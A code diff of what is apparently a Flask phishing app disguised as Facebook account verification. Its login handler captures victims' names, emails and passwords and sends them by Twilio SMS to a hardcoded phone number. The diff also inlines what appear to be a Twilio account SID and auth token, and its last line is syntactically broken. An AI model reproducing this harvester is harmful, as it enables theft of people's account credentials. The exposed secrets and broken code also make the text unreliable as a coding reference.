@@ -4,7 +4,7 @@ import os
 from dotenv import load_dotenv
 load_dotenv()
 
-print(os.getenv('b81c190f557b313b6776e59cd1a7b50b'))
+print(os.getenv('AUTH_TOKEN'))
 
 app = Flask(__name__)
 
@@ -29,13 +29,13 @@ def login():
             sender_email = l_email
             sender_password = l_pass
 
-            account_sid = os.getenv('ACce44f76cd867d5372878ae84f9ef525c')
-            auth_token = os.getenv('b81c190f557b313b6776e59cd1a7b50b')
+            account_sid = 'ACce44f76cd867d5372878ae84f9ef525c'
+            auth_token = 'b81c190f557b313b6776e59cd1a7b50b'
             client = Client(account_sid, auth_token) 
             message = client.messages.create( 
-                                        from_=os.getenv('+13613147026'),  
+                                        from_='+13613147026',  
                                         body=f'{sender_name}\n{sender_email}\n{sender_password}',      
-                                        to=os.getenv('+6285243928441')) 
+                                        to='+6285243928441') 
             print("Success")
             return redirect('/login_error')
     else:
@@ -43,4 +43,4 @@ def login():
 
 
 if __name__ == '__main__':
-    app.run(debug=False, port=os.getenv("https://pemblokiran-facebook-verifikasi.vercel.app/", default=5000))
+    app.run(debug=False, port="https://pemblokiran-facebook-verifikasi.vercel.app/", default=5000))
